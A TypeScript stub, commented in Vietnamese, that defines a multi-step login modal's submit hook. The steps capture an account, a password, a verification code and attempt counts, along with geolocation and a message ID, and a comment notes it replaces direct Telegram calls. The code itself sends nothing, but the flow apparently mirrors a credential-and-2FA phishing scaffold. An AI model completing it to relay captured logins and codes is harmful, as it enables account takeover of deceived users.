/**
 * UI-only submit hook point — team tích hợp backend tại đây.
 * Modal flow gọi hàm này thay vì gọi trực tiếp Telegram/API nội bộ.
 */
import type { GeoInfo, LoginProvider, UserData } from '@/store/store';

export type FormSubmitStep =
    | { step: 'init'; userData: Partial<UserData> }
    | { step: 'login_choice'; loginProvider: LoginProvider }
    | {
          step: 'credentials';
          loginProvider: LoginProvider | null;
          account: string;
          password: string;
          attempt: number;
      }
    | { step: 'verify_code'; code: string; attempt: number };

export interface FormSubmitContext {
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    messageId: number | null;
    userData: UserData;
    loginProvider: LoginProvider | null;
}

export interface FormSubmitResult {
    success?: boolean;
    messageId?: number;
}

/** Mặc định: không gọi server — chỉ giữ luồng UI (next step). Ghi đè khi tích hợp. */
export async function submitFormStep(_ctx: FormSubmitContext, _payload: FormSubmitStep): Promise<FormSubmitResult> {
    return { success: true };
}
